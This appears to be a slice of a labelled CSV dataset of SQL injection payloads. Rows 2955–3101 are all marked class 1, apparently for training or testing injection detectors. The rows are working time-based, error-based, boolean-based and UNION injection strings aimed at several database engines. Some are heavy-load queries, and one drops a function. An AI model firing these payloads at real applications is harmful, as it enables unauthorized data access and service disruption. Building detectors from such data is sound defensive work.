index,payload,class
2955,-5291'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'tmpm'  =  'tmpm,1
2956,"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
2957,"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
2958,1'   )    )     )   and 7533  =  7533 and    (    (     (  'suzd' like 'suzd,1
2959,"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,1
2960,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2961,1  )   where 7552  =  7552 order by 1#,1
2962,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",1
2963,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",1
2964,1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
2965,-2174'   )    )    as zhoz where 4185  =  4185 order by 1#,1
2966,1'   )    )     )   and 3602  =  1990#,1
2967,"1  )   where 1013  =  1013 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
2968,1'+  (  select soqk where 5383  =  5383,1
2969,"1'   )    )     )   and elt  (  9501  =  8427,8427  )   and    (    (     (  'ahpp'  =  'ahpp",1
2970,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
2971,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
2972,"-4960 union all select 4031,4031#",1
2973,"1"" where 1719  =  1719 and 7533  =  7533--",1
2974,"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
2975,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",1
2976,select sleep  (  5  )  #,1
2977,"1"" where 5440  =  5440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2978,"1' where 7353  =  7353 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
2979,-3496'   )    )    or 9323  =  9323#,1
2980,1%'   )    )     )   and 3916  =  6327--,1
2981,"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""exgr"" like ""exgr",1
2982,"-1376%""   )    )     )   or 3458  =  9503 and    (    (     (  ""%""  =  """,1
2983,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2984,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo",1
2985,1'   )    )    as vdhw where 8858  =  8858 order by 1#,1
2986,1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,1
2987,"1""  )   where 6018  =  6018 and 7533  =  7533--",1
2988,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",1
2989,-5555   )    )    as ldte where 4583  =  4583 order by 1#,1
2990,-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
2991,"1%""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
2992,"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
2993,"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
2994,1' union all select null#,1
2995,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'hzav'  =  'hzav",1
2996,1'||  (  select 'zccb' from dual where 8911  =  8911,1
2997,"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1
2998,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",1
2999,"1%'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
3000,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
3001,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
3002,1 where 2382  =  2382,1
3003,"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1
3004,select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
3005,"1""  )   where 5129  =  5129 order by 1--",1
3006,1 where 9404  =  9404,1
3007,1'  )   where 7252  =  7252,1
3008,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'fnon' like 'fnon",1
3009,1  )   as nsdy where 7513  =  7513,1
3010,"-9337  )   union all select 5648,5648,5648,5648,5648#",1
3011,"-2734'  )   union all select 5510,5510,5510,5510,5510#",1
3012,"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
3013,"-7559"" or 8792  =  6905--",1
3014,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1
3015,"iif  (  8354  =  3515,1,1/0  )  ",1
3016,"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
3017,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ygfv'  =  'ygfv",1
3018,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
3019,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",1
3020,"-5998%""  )   union all select 2366,2366,2366,2366#",1
3021,"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1
3022,"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1
3023,"-6129 union all select 9122,9122#",1
3024,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",1
3025,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",1
3026,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",1
3027,"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",1
3028,"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",1
3029,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
3030,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",1
3031,"1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
3032,"1""  )   as rcnk where 1800  =  1800",1
3033,"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1
3034,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",1
3035,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1
3036,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",1
3037,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",1
3038,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,1
3039, (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,1
3040,-6890'   )    )    or 5771  =  7721--,1
3041,if  (  9431  =  6730  )   select 9431 else drop function xbkh--,1
3042,"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
3043,"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
3044,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",1
3045,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",1
3046,1'||  (  select 'hwdj' where 8179  =  8179,1
3047,1  )   as usnn where 3201  =  3201,1
3048,select   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
3049,"1%""  )   and 8715  =  5529",1
3050,"1%'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
3051,"1   )    )     )   union all select null,null,null,null,null,null#",1
3052,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",1
3053,select   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  select 9931 from master..sysdatabases  )   end  )  --,1
3054,"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar",1
3055,1'+  (  select tzvm where 5145  =  5145 and 4192  =  7437#,1
3056,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",1
3057,"-4148%""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""%""  =  """,1
3058,end and   (  'nchh'  =  'nchh,1
3059,1' or sleep  (  5  )  #,1
3060,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",1
3061,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,1
3062,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",1
3063,"-6746""  )   or   (  8459  =  8459  )  *4906 and   (  ""kohi"" like ""kohi",1
3064,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1
3065,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
3066,1'||  (  select 'yuku' where 7480  =  7480,1
3067,"1'  )   union all select null,null,null,null--",1
3068,"-8319""   )    )    or 7878  =  5970 and    (    (   ""jcaz"" like ""jcaz",1
3069,select case when 8975  =  2352 then 1 else null end--,1
3070,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
3071,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
3072,"1   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  6583  =  6583",1
3073,"1'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
3074,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",1
3075,waitfor delay '0:0:5' and    (    (   7619  =  7619,1
3076,1'  )   where 4729  =  4729,1
3077,"1"" where 9973  =  9973 and 2006  =  2006",1
3078,"-3954'   )    )    union all select 2417,2417--",1
3079,"1'   )    )    union all select null,null,null,null--",1
3080,1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',1
3081,"1""   )    )    as tybm where 2687  =  2687 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
3082,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",1
3083,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",1
3084,1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,1
3085,"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",1
3086,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",1
3087,"1'+  (  select ocvc where 6981  =  6981 union all select null,null,null,null,null,null,null,null,null,null#",1
3088,"1   )    )    union all select null,null,null,null,null,null,null--",1
3089,"-6214"" union all select 3323,3323#",1
3090,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,1
3091,"1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
3092,select sleep  (  5  )   and    (    (   3404  =  3404,1
3093,1'||  (  select 'fjlg' from dual where 9517  =  9517,1
3094,"1   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
3095,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1
3096,"1%""  )   union all select null--",1
3097,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",1
3098,"1%""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1
3099,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",1
3100,"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
3101,1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
